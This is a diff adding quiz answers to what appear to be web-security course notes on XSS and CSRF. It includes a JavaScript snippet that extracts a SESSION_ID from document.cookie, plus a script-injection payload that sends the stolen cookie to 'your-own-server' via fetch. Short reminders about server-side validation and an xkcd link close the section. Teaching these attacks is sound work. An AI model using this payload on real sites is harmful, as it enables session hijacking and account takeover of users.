@@ -94,5 +94,14 @@ fetch('http://www.example.com", {
   * hence: ALWAYS validate your user's input from server-side
 
 ### Quiz: XSS
+* to get session id's value:
+  `document.cookie.slice(document.cookie.indexOf('SESSION_ID')).split('=')[1];`
+* to inject javascript into input field:
+  `<script>fetch('http://your-own-server/?key=<cookie_value_above>');</script>`
+* checkout https://xkcd.com/327/: ![xkcd.com/327](https://imgs.xkcd.com/comics/exploits_of_a_mom.png "xkcd.com/327")
+
 ### Security outro
+* back-end needs to implement validation
+* there's always potential risk, so better to protect your self from CSRF or XSS
+
 ### Course outro
